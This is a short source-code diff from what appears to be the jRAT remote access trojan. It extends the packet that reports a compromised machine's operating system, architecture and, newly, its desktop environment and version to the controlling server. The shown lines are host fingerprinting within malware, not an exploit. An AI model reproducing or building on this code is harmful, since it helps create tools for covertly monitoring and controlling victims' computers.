@@ -6,6 +6,7 @@ import se.jrat.common.io.StringWriter;
 
 import com.redpois0n.oslib.AbstractOperatingSystem;
 import com.redpois0n.oslib.Arch;
+import com.redpois0n.oslib.DesktopEnvironment;
 import com.redpois0n.oslib.OperatingSystem;
 import com.redpois0n.oslib.linux.LinuxOperatingSystem;
 import com.redpois0n.oslib.osx.OSXOperatingSystem;
@@ -19,6 +20,13 @@ public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {
 		sw.writeLine(os.getType().getName());
 		sw.writeLine(os.getDetailedString());
 		sw.writeLine(Arch.getArch().getName());
+		
+		DesktopEnvironment de = os.getDesktopEnvironment();
+		sw.writeLine(de.getSearch());	
+		dos.writeBoolean(de.getVersion() != null);
+		if (de.getVersion() != null) {
+			sw.writeLine(de.getVersion());
+		}
 		
 		if (os.getType() == OperatingSystem.LINUX) {
 			LinuxOperatingSystem los = (LinuxOperatingSystem) os;
